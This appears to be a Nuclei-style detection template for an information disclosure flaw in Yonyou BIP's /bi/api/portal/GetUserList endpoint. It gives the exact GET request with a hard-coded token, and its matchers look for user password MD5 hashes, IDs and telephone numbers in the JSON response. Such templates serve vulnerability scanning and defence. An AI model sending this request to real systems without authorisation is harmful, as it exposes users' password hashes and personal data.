id: poc-yaml-yongyou-bip-getuserlist-info-leak
info:
  name: 用友BIP /bi/api/Portal/GetUserList 信息泄露漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: information-disclosure
http:
  - method: GET
    path:
      - "{{BaseURL}}/bi/api/portal/GetUserList?token=e30fe47a-f33e-463e-bc4a-843957ca88dd_263720ea7e397482da220115cae828_1214162142339"
    headers:
      Accept: application/json
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: dsl
        dsl:
          - contains(find_json(body, '0.PasswordMd5'), '')
          - contains(find_json(body, '0.Id'), '')
          - contains(find_json(body, '0.Telephone'), '')
